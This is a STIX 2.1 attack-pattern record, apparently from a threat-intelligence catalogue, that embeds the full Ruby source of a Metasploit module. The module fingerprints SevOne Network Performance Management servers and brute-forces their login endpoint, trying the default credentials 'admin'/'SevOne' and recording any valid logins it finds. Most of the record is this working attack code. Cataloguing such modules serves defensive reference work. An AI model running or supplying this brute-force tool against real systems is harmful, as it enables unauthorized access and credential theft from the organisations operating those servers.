{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5b44611-6488-4468-81da-84d25f70b605",
    "created": "2024-08-14T16:30:44.33582Z",
    "modified": "2024-08-14T16:30:44.335824Z",
    "name": "SevOne Network Performance Management Application Brute Force Login Utility",
    "description": " This module scans for SevOne Network Performance Management System Application finds its version, and performs login brute force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/sevone_enum.rb",
            "external_id": "sevone_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'\t=> 'SevOne Network Performance Management Application Brute Force Login Utility',\n      'Description'    => %{\n          This module scans for SevOne Network Performance Management System Application,\n        finds its version, and performs login brute force to identify valid credentials.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'DisclosureDate' => '2013-06-07',\n      'License'        => MSF_LICENSE\n    ))\n  register_options(\n    [\n      OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),\n      OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne'])\n    ])\n  end\n\n  def run_host(ip)\n    unless is_app_sevone?\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be SevOne. Module will not continue.\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Starting login brute force...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the app actually isn't SevOne?\n  #\n  def is_app_sevone?\n    res = send_request_cgi(\n    {\n      'uri'       => '/doms/about/index.php',\n      'method'    => 'GET'\n    })\n\n    if (res and res.code.to_i == 200 and res.get_cookies.include?('SEVONE'))\n      version_key = /Version: <strong>(.+)<\\/strong>/\n      version = res.body.scan(version_key).flatten\n      print_good(\"#{rhost}:#{rport} - Application confirmed to be SevOne Network Performance Management System version #{version}\")\n      return true\n    end\n    return false\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n  def do_login(user, pass)\n    vprint_status(\"#{rhost}:#{rport} - Trying username:'#{user.inspect}' with password:'#{pass.inspect}'\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => \"/doms/login/processLogin.php\",\n        'method'    => 'GET',\n        'vars_get'    =>\n        {\n          'login' => user,\n          'passwd' => pass,\n          'tzOffset' => '-25200',\n          'tzString' => 'Thur+May+05+1983+05:05:00+GMT+0700+'\n        }\n      })\n\n    if res.nil?\n      print_error(\"#{rhost}:#{rport} - Connection timed out\")\n      return :abort\n    end\n\n    check_key = \"The user has logged in successfully.\"\n\n    key = JSON.parse(res.body)[\"statusString\"]\n\n    if (not res or key != \"#{check_key}\")\n      vprint_error(\"#{rhost}:#{rport} - FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}\")\n      return :skip_pass\n    else\n      print_good(\"#{rhost}:#{rport} - SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'SevOne Network Performance Management System Application',\n        user: user,\n        password: pass,\n        proof: key\n      )\n      return :next_user\n    end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-07"
}